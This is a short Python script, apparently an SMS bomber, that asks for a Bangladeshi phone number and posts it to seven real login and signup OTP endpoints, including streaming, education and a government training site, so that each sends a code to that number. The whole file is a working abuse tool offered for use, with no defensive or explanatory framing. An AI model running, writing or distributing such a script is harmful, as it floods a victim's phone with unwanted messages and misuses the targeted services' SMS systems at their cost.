import requests


def send_sms(number):
    # Format number with +880
    number_with_code = f"+880{number}" if not number.startswith(
        "+880") else number
    # Format number without +880
    number_without_code = number.replace("+880", "")

    urls = [
        {
            "url": "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en",
            "payload": {"number": number_with_code}
        },
        {
            "url": "https://prod-api.hoichoi.dev/core/api/v1/auth/signinup/code",
            "payload": {"phoneNumber": number_with_code}
        }, {
            "url": "https://training.gov.bd/backoffice/api/user/sendOtp",
            "payload": {"mobile": number_without_code}
        }, {
            "url": "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en",
            "payload": {"number": number_with_code}
        }, {
            "url": "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en",
            "payload": {"number": number_with_code}
        }, {
            "url": "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web",
            "payload": {"mobile_no": number_without_code}
        },
        {
            "url": "https://api.apex4u.com/api/auth/login",
            "payload": {"phoneNumber": number_without_code}
        }
    ]

    for i, api in enumerate(urls, 1):
        try:
            response = requests.post(api["url"], json=api["payload"])
            if response.status_code == 200:
                print(f"{i}. Success")
            else:
                print(f"{i}. Failed")
        except:
            print(f"{i}. Failed")


if __name__ == "__main__":
    number = input("Number enter korun: ")
    send_sms(number)
